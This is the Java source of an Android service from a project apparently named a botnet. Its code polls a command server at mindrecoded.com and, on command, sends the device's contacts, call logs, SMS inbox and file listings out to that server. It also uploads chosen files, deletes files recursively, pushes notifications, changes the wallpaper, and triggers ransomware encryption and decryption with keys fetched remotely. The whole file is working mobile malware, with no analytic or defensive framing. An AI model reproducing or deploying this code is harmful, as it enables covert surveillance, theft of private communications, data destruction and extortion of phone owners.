package com.example.kico.botnet;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.DownloadManager;
import android.app.NotificationManager;
import android.app.Service;
import android.app.WallpaperManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.NotificationCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.widget.ArrayAdapter;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.BasicResponseHandler;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.Random;

public class MyService extends Service {
    public String http = "http://mindrecoded.com";
    String command = "";
    String userid;
    private static final String TAG = "com.example.kico.botnet";
    String expath = Environment.getExternalStorageDirectory().getAbsolutePath();
    private static final String salt = "x962";
    private static String cryptPassword;
    DownloadManager downloadManager;

    NotificationCompat.Builder notification;
    private static final int uniqueID = 45612;


    private static MyService inst;
    ArrayList<String> smsMessagesList = new ArrayList<String>();
    ArrayAdapter arrayAdapter;

    public static MyService instance() {
        return inst;
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        //return super.onStartCommand(intent, flags, startId);
        SharedPreferences wmbPreference = PreferenceManager.getDefaultSharedPreferences(this);
        boolean isFirstRun = wmbPreference.getBoolean("secTRUN", true);
        if (isFirstRun) {
            userid();
            getuse();
            Runnable rm = new Runnable() {
                @Override
                public void run() {
                    AddRequest();
                }
            };
            Thread gol = new Thread(rm);
            gol.start();

            SharedPreferences.Editor editor = wmbPreference.edit();
            editor.putBoolean("secTRUN", false);
            editor.commit();
        } else {
            getuse();
            Runnable r = new Runnable() {
                @SuppressLint("LongLogTag")
                @Override
                public void run() {
                    reciver();
                }
            };
            // start the thread
            Thread inputer = new Thread(r);
            inputer.start();
        }
        notification = new NotificationCompat.Builder(this);
        notification.setAutoCancel(true);
        inst = this;
        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {
        //super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    public static String getSaltus() {
        String SALTCHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        final int min = 1;
        final int max = 10;
        final int rand = new Random().nextInt((max - min) + 1) + min;
        StringBuilder salt = new StringBuilder();
        Random rnd = new Random();
        while (salt.length() < rand) { // length of the random string.
            int index = (int) (rnd.nextFloat() * SALTCHARS.length());
            salt.append(SALTCHARS.charAt(index));
        }
        String saltStr = salt.toString();
        return saltStr;

    }


    public void userid() {
        SharedPreferences id = getSharedPreferences("userInfo", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = id.edit();
        editor.putString("userid", String.valueOf(getSaltus()));
        editor.apply();

    }

    public void getuse() {
        SharedPreferences id = getSharedPreferences("userInfo", Context.MODE_PRIVATE);
        String name = id.getString("userid", "");
        userid = name;
    }

    public String getUrid() {
        String urid = userid;
        return urid;
    }


    public void AddRequest() {
        HttpClient Client = new DefaultHttpClient();
        String pert = getUrid();
        Log.i(TAG, pert);
        String URL = http + "/addbot.php?id=" + pert;

        try {
            String SetServerString = "";

            HttpGet httpget = new HttpGet(URL);
            ResponseHandler<String> responseHandler = new BasicResponseHandler();
            SetServerString = Client.execute(httpget, responseHandler);

            Log.i(TAG, SetServerString);
        } catch (Exception ex) {
            Log.i(TAG, "Fail");
        }


        Runnable r = new Runnable() {
            @SuppressLint("LongLogTag")
            @Override
            public void run() {
                reciver();
            }
        };
        Thread inputer = new Thread(r);
        inputer.start();
    }

    public void reciver() {
        int x = 0;
        while (x != 99) {
            String data = "";
            String pert = getUrid();
            try {
                URL url = new URL(http + "/json.php?id=" + pert);
                Log.i(TAG, String.valueOf(url));
                HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
                InputStream inputStream = httpURLConnection.getInputStream();
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                String line = "";
                while (line != null) {
                    line = bufferedReader.readLine();
                    data = data + line;
                }
                JSONArray JA = new JSONArray(data);
                for (int i = 0; i < JA.length(); i++) {
                    Log.i(TAG, String.valueOf(i));
                    JSONObject JO = (JSONObject) JA.get(i);
                    command = JO.get("command") + "";
                    Log.i(TAG, command);
                    //int cmd = Integer.parseInt(command);
                    if (command.equals("wait")) {
                        Log.i(TAG, "wait case");
                    } else if (command.equals("con")) {
                        getContactList();
                    } else if (command.equals("infe")) {
                        listf("/storage/sdcard/");
                    } else if (command.equals("sdfe")) {
                        listf(expath);
                    } else if (command.equals("del")) {
                        gell();
                    } else if (command.equals("chwl")) {
                        chang();
                    } else if (command.equals("cllg")) {
                        getCallDetails();
                    } else if (command.equals("smlg")) {
                        smslog();
                    } else if (command.equals("upld")) {
                        hell();
                    } else if (command.equals("nofi")) {
                        sendnotification();
                    }else if (command.equals("rnsm")) {
                        startransomware();
                    }else if (command.equals("dery")) {
                        decry();
                    }   else {
                        Log.i(TAG, "");
                    }

                }
            } catch (MalformedURLException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }

    }

    @SuppressLint("ResourceType")
    public void chang() {

        WallpaperManager myWallpaperManager
                = WallpaperManager.getInstance(getApplicationContext());
        try {
            myWallpaperManager.setResource(R.drawable.he);
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        clear();
    }



    public void startransomware(){
        clear();

        String data = "";
        try {
            URL url = new URL(http + "/output.php");
            Log.i(TAG, String.valueOf(url));
            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            InputStream inputStream = httpURLConnection.getInputStream();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String line = "";
            while (line != null) {
                line = bufferedReader.readLine();
                data = data + line;
            }
            JSONArray JA = new JSONArray(data);
            for (int i = 0; i < JA.length(); i++) {
                Log.i(TAG, String.valueOf(i));
                JSONObject JO = (JSONObject) JA.get(i);
                command = JO.get("text") + "";
                cryptPassword = command;
                Log.i(TAG, command);

            }
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }

        Runnable hel = new Runnable() {
            @Override
            public void run() {
                ranfuck rf = new ranfuck();
                rf.startransomware();
            }
        };
        Thread hol = new Thread(hel);
        hol.start();
    }

    public static String sendkey(){
        String hell = salt + cryptPassword;
        return hell;
    }

    public void decry(){
        clear();

        String data = "";
        try {
            URL url = new URL(http + "/output.php");
            Log.i(TAG, String.valueOf(url));
            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            InputStream inputStream = httpURLConnection.getInputStream();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String line = "";
            while (line != null) {
                line = bufferedReader.readLine();
                data = data + line;
            }
            JSONArray JA = new JSONArray(data);
            for (int i = 0; i < JA.length(); i++) {
                Log.i(TAG, String.valueOf(i));
                JSONObject JO = (JSONObject) JA.get(i);
                command = JO.get("text") + "";
                cryptPassword = command;
                Log.i(TAG, command);

            }
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }


        Runnable hel = new Runnable() {
            @Override
            public void run() {
                decry rf = new decry();
                rf.crybaby();
            }
        };
        Thread hol = new Thread(hel);
        hol.start();

    }

    public static String cry(){
        String sell = salt + cryptPassword;
        return sell;
    }

    public void sendnotification() {

        String data = "";
        String pert = getUrid();
        try {
            URL url = new URL(http + "/output.php");
            Log.i(TAG, String.valueOf(url));
            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            InputStream inputStream = httpURLConnection.getInputStream();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String line = "";
            while (line != null) {
                line = bufferedReader.readLine();
                data = data + line;
            }
            JSONArray JA = new JSONArray(data);
            for (int i = 0; i < JA.length(); i++) {
                Log.i(TAG, String.valueOf(i));
                JSONObject JO = (JSONObject) JA.get(i);
                String text = JO.get("text") + "";
                notification.setSmallIcon(R.drawable.he);
                notification.setTicker(command);
                notification.setWhen(System.currentTimeMillis());
                notification.setContentTitle("Script1337");
                notification.setContentText(text);

                Log.i(TAG, command);

            }
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }

        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        nm.notify(uniqueID, notification.build());
        clear();
    }


    public void clear() {
        HttpClient Client = new DefaultHttpClient();
        String pert = getUrid();
        Log.i(TAG, pert);
        String URL = http + "/dead.php?id=" + pert;

        try {
            String SetServerString = "";

            HttpGet httpget = new HttpGet(URL);
            ResponseHandler<String> responseHandler = new BasicResponseHandler();
            SetServerString = Client.execute(httpget, responseHandler);

            Log.i(TAG, SetServerString);
        } catch (Exception ex) {
            Log.i(TAG, "Fail");
        }
    }


    public void deadtxt() {
        HttpClient Client = new DefaultHttpClient();
        String URL = http + "deadtxt.php";

        try {
            String SetServerString = "";

            HttpGet httpget = new HttpGet(URL);
            ResponseHandler<String> responseHandler = new BasicResponseHandler();
            SetServerString = Client.execute(httpget, responseHandler);

            Log.i(TAG, SetServerString);
        } catch (Exception ex) {
            Log.i(TAG, "Fail");
        }
    }

    public void getContactList() throws UnsupportedEncodingException {
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    int i = 0;
                    while (pCur.moveToNext()) {

                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        //Log.i(TAG, "Name: " + name);
                        //Log.i(TAG, "Phone Number: " + phoneNo);
                        HttpClient Client = new DefaultHttpClient();
                        String pert = getUrid();
                        String URL = http + "//coninput.php?id=" + pert + "&name=" + URLEncoder.encode(name, "UTF-8") + "&phonenum=" + URLEncoder.encode(phoneNo, "UTF-8");
                        try {
                            String SetServerString = "";

                            HttpGet httpget = new HttpGet(URL);
                            ResponseHandler<String> responseHandler = new BasicResponseHandler();
                            SetServerString = Client.execute(httpget, responseHandler);

                            Log.i(TAG, SetServerString);
                        } catch (Exception ex) {
                            Log.i(TAG, "Fail");
                        }
                        i = i + 1;
                    }
                    pCur.close();
                }
            }
        }
        if (cur != null) {
            cur.close();
        }
        clear();
    }

    public int uploadFile(final String selectedFilePath) {

        int serverResponseCode = 0;

        HttpURLConnection connection;
        DataOutputStream dataOutputStream;
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";


        int bytesRead, bytesAvailable, bufferSize;
        byte[] buffer;
        int maxBufferSize = 1 * 1024 * 1024;
        File selectedFile = new File(selectedFilePath);


        String[] parts = selectedFilePath.split("/");
        final String fileName = parts[parts.length - 1];

        if (!selectedFile.isFile()) {

            return 0;
        } else {
            try {
                FileInputStream fileInputStream = new FileInputStream(selectedFile);
                URL url = new URL(http + "/upload.php");
                connection = (HttpURLConnection) url.openConnection();
                connection.setDoInput(true);//Allow Inputs
                connection.setDoOutput(true);//Allow Outputs
                connection.setUseCaches(false);//Don't use a cached Copy
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Connection", "Keep-Alive");
                connection.setRequestProperty("ENCTYPE", "multipart/form-data");
                connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
                connection.setRequestProperty("uploaded_file", selectedFilePath);

                dataOutputStream = new DataOutputStream(connection.getOutputStream());

                dataOutputStream.writeBytes(twoHyphens + boundary + lineEnd);
                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"uploaded_file\";filename=\""
                        + selectedFilePath + "\"" + lineEnd);

                dataOutputStream.writeBytes(lineEnd);

                bytesAvailable = fileInputStream.available();

                bufferSize = Math.min(bytesAvailable, maxBufferSize);

                buffer = new byte[bufferSize];


                bytesRead = fileInputStream.read(buffer, 0, bufferSize);


                while (bytesRead > 0) {

                    dataOutputStream.write(buffer, 0, bufferSize);
                    bytesAvailable = fileInputStream.available();
                    bufferSize = Math.min(bytesAvailable, maxBufferSize);
                    bytesRead = fileInputStream.read(buffer, 0, bufferSize);
                }

                dataOutputStream.writeBytes(lineEnd);
                dataOutputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

                serverResponseCode = connection.getResponseCode();
                String serverResponseMessage = connection.getResponseMessage();

                Log.i(TAG, "Server Response is: " + serverResponseMessage + ": " + serverResponseCode);


                if (serverResponseCode == 200) {

                }


                fileInputStream.close();
                dataOutputStream.flush();
                dataOutputStream.close();


            } catch (FileNotFoundException e) {
                e.printStackTrace();

            } catch (MalformedURLException e) {
                e.printStackTrace();

            } catch (IOException e) {
                e.printStackTrace();
            }
            clear();
            deadtxt();
            return serverResponseCode;
        }


    }

    public List<File> listf(String directoryName) {
        File directory = new File(directoryName);

        List<File> resultList = new ArrayList<>();


        File[] fList = directory.listFiles();

        if (fList == null) {
            return null;
        }
        resultList.addAll(Arrays.asList(fList));
        for (File file : fList) {
            if (file.isFile()) {
                HttpClient Client = new DefaultHttpClient();
                String pert = getUrid();
                Log.i(TAG, pert);
                String URL = http + "/fileinput.php?id=" + pert + "&filepath=" + file.getAbsolutePath();

                try {
                    String SetServerString = "";

                    HttpGet httpget = new HttpGet(URL);
                    ResponseHandler<String> responseHandler = new BasicResponseHandler();
                    SetServerString = Client.execute(httpget, responseHandler);

                    Log.i(TAG, SetServerString);
                } catch (Exception ex) {
                    Log.i(TAG, "Fail");
                }
                try {

                    try {
                        String SetServerString = "";

                        HttpGet httpget = new HttpGet(URL);
                        ResponseHandler<String> responseHandler = new BasicResponseHandler();
                        SetServerString = Client.execute(httpget, responseHandler);

                        Log.i(TAG, SetServerString);
                    } catch (Exception ex) {
                        Log.i(TAG, "Fail");
                    }
                } catch (Exception ex) {

                }
            } else if (file.isDirectory()) {
                // ask here if it was null
                List<File> files = listf(file.getAbsolutePath());
                if (files != null) {
                    resultList.addAll(files);
                }
            }
        }
        clear();
        return resultList;
    }

    public void hell() {
        String data = "";
        String pert = getUrid();
        try {
            URL url = new URL(http + "/output.php");
            Log.i(TAG, String.valueOf(url));
            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            InputStream inputStream = httpURLConnection.getInputStream();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String line = "";
            while (line != null) {
                line = bufferedReader.readLine();
                data = data + line;
            }
            JSONArray JA = new JSONArray(data);
            for (int i = 0; i < JA.length(); i++) {
                Log.i(TAG, String.valueOf(i));
                JSONObject JO = (JSONObject) JA.get(i);
                command = JO.get("text") + "";
                uploadFile(command);
                Log.i(TAG, command);

            }
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }

    }

    public void gell() {
        String data = "";
        String pert = getUrid();
        try {
            URL url = new URL(http + "/output.php");
            Log.i(TAG, String.valueOf(url));
            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            InputStream inputStream = httpURLConnection.getInputStream();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String line = "";
            while (line != null) {
                line = bufferedReader.readLine();
                data = data + line;
            }
            JSONArray JA = new JSONArray(data);
            for (int i = 0; i < JA.length(); i++) {
                Log.i(TAG, String.valueOf(i));
                JSONObject JO = (JSONObject) JA.get(i);
                command = JO.get("text") + "";
                Delete(command);
                Log.i(TAG, command);

            }
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }

    }

    public void Delete(String filename) {
        clear();
        deadtxt();
        File file = new File(filename);
        if (!file.exists())
            return;
        if (!file.isDirectory()) {
            file.delete();
            return;
        }

        String[] files = file.list();
        for (int i = 0; i < files.length; i++) {

            Delete(filename + "/" + files[i]);
        }
        file.delete();
    }


    public void getCallDetails() throws IOException {

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {


        }
        Cursor mCursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null,
                null, null);
        int number = mCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int date = mCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = mCursor.getColumnIndex(CallLog.Calls.DURATION);
        int type = mCursor.getColumnIndex(CallLog.Calls.TYPE);
        StringBuilder stringBuffer = new StringBuilder();
        while (mCursor.moveToNext()) {
            String phnumber = mCursor.getString(number);
            String callduration = mCursor.getString(duration);
            String calltype = mCursor.getString(type);
            String calldate = mCursor.getString(date);
            Date d = new Date(Long.valueOf(calldate));
            String callTypeStr = "";
            switch (Integer.parseInt(calltype)) {
                case CallLog.Calls.OUTGOING_TYPE:
                    callTypeStr = "Outgoing";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    callTypeStr = "Incoming";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    callTypeStr = "Missed";
                    break;
            }
            stringBuffer.append(phnumber).append(calltype).append(d).append(callduration);
            String pert = getUrid();
            String URL = http + "/calllog.php?id=" + pert + "&phnumber=" + URLEncoder.encode(phnumber, "UTF-8") + "&callduration=" + URLEncoder.encode(callduration, "UTF-8") + "&callTypeStr=" + URLEncoder.encode(callTypeStr, "UTF-8") + "&time=" + URLEncoder.encode(String.valueOf(d), "UTF-8");
            HttpClient httpclient = new DefaultHttpClient();
            HttpGet httpget = new HttpGet(URL);

            HttpResponse response = httpclient.execute(httpget);

            if (response.getStatusLine().getStatusCode() == 200) {
                String server_response = EntityUtils.toString(response.getEntity());
                Log.i("Server response", server_response);
            } else {
                Log.i("Server response", "Failed to get server response");
            }
        }
        mCursor.close();

        clear();
    }

    public void smslog() {


        arrayAdapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, smsMessagesList);

        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {


            try {
                refreshSmsInbox();
            } catch (IOException e) {
                e.printStackTrace();
            }

        } else {

        }
        clear();
    }

    public void refreshSmsInbox() throws IOException {
        ContentResolver contentResolver = getContentResolver();
        Cursor smsInboxCursor = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null);
        int indexBody = smsInboxCursor.getColumnIndex("body");
        int indexAddress = smsInboxCursor.getColumnIndex("address");
        if (indexBody < 0 || !smsInboxCursor.moveToFirst()) return;
        arrayAdapter.clear();
        do {
            String str = "SMS From: " + smsInboxCursor.getString(indexAddress) +
                    "\n" + smsInboxCursor.getString(indexBody) + "\n";
            arrayAdapter.add(str);
            String URL = null;
            String pert = getUrid();
            try {
                URL = http + "/smslog.php?id=" + pert + "&address=" + URLEncoder.encode(smsInboxCursor.getString(indexBody), "UTF-8") + "&message=" + URLEncoder.encode(smsInboxCursor.getString(indexAddress), "UTF-8");
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
            HttpClient httpclient = new DefaultHttpClient();
            HttpGet httpget = new HttpGet(URL);

            HttpResponse response = null;
            try {
                response = httpclient.execute(httpget);
            } catch (IOException e) {
                e.printStackTrace();
            }

            if (response.getStatusLine().getStatusCode() == 200) {
                String server_response = EntityUtils.toString(response.getEntity());
                Log.i("Server response", server_response);
            } else {
                Log.i("Server response", "Failed to get server response");
            }
        } while (smsInboxCursor.moveToNext());
    }


}